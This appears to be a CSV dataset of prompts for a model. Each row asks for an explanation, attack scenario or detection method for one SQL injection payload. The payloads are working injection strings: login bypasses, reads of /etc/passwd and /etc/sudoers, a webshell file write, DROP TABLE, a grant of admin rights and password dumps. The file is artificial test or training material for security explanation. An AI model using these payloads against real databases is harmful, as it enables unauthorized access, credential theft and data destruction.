prompt,attack_type
What happens if a user enters this SQL injection into a login field: ' OR (SELECT LENGTH(LOAD_FILE('/etc/hosts'))) > 0 --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1; SELECT * FROM admin --,SQL Injection
Describe how this payload can bypass authentication: ' OR TRUE; SELECT load_file('/etc/passwd') --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR 1=1 RETURNING (SELECT current_user) --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1;%23,SQL Injection
Show how an attacker might use this SQL injection: ' INTO OUTFILE '/tmp/evil.php' RETURNING * --,SQL Injection
Show how an attacker might use this SQL injection: ' INJECT INTO OUTFILE '/tmp/a.txt' --,SQL Injection
"Generate a security explanation for this SQLi payload: ' OR JSON_DEPTH('[1,2]')>0 --",SQL Injection
Generate a security explanation for this SQLi payload: ' OR 1=1; SELECT * FROM auth --,SQL Injection
"Write a natural-language explanation of this SQL injection string: ' OR instr((SELECT sql FROM sqlite_master LIMIT 1),'CREATE')>0 --",SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR 1=1# ORDER BY 4,SQL Injection
How would you detect the presence of this SQLi payload: ' OR (SELECT LENGTH(@@version))>1 --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR TRUE; FLUSH TABLES --,SQL Injection
How would you detect the presence of this SQLi payload: ' UNION SELECT MD5('test') --,SQL Injection
"Describe a scenario where a hacker uses this payload: ' OR FIELD('a','a','b','c')=1 --",SQL Injection
Show how an attacker might use this SQL injection: ' OR CASE WHEN (1=1) THEN 1 ELSE 0 END --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR database() IN (SELECT schema_name FROM information_schema.schemata) --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR 1=1 INTO DUMPFILE '/var/lib/mysql/x3.bin' --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR (SELECT table_name FROM information_schema.tables LIMIT 1) LIKE '%' --,SQL Injection
"Write a natural-language explanation of this SQL injection string: ' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u' --",SQL Injection
Generate a security explanation for this SQLi payload: ' OR (SELECT sqlite_version()) LIKE '%' RETURNING * --,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' UNION SELECT NULL,LOAD_FILE('/var/log/dmesg') --",SQL Injection
What happens if a user enters this SQL injection into a login field: ' RETURNING hex(load_file('/etc/hostname')) --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR TRUE; SET GLOBAL sql_mode='' --,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' OR 1=1; SELECT user,password FROM mysql.user --",SQL Injection
"Demonstrate how this SQL injection exposes database data: ' OR ASCII(SUBSTRING((SELECT user()),1,1))>0 --",SQL Injection
Explain how this SQL injection payload works: ' AND length((SELECT schema_name FROM information_schema.schemata LIMIT 1))>0 --,SQL Injection
Write a natural-language explanation of this SQL injection string: 1; DROP TABLE users;,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR CEIL(1.1)=2 --,SQL Injection
Describe how this payload can bypass authentication: ' OR hex((SELECT name FROM sqlite_master LIMIT 1)) LIKE '%' --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR TRUE; UPDATE users SET admin=1 WHERE username='guest' --,SQL Injection
Generate a security explanation for this SQLi payload: ' OR LOAD_FILE('/proc/version') LIKE '%' --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR (SELECT LENGTH(@@version))>1 --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR hex(LOAD_FILE('/etc/sudoers')) LIKE '%' --,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' OR ASCII(SUBSTRING((SELECT user()),1,1))>50 --",SQL Injection
Explain how this SQL injection payload works: ' OR 1=1; WAITFOR TIME '00:00:10' --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR (SELECT SLEEP(3)) --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR randomblob(16) IS NOT NULL --,SQL Injection
Describe how this payload can bypass authentication: '/**/OR/**/1/**/=/**/1 --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1 IN (SELECT password FROM users) --,SQL Injection
Show how an attacker might use this SQL injection: ' --+OR+1=1,SQL Injection
Generate a security explanation for this SQLi payload: ' OR TRUE; FLUSH TABLES --,SQL Injection
Describe how this payload can bypass authentication: ' OR database() IN (SELECT schema_name FROM information_schema.schemata) --,SQL Injection
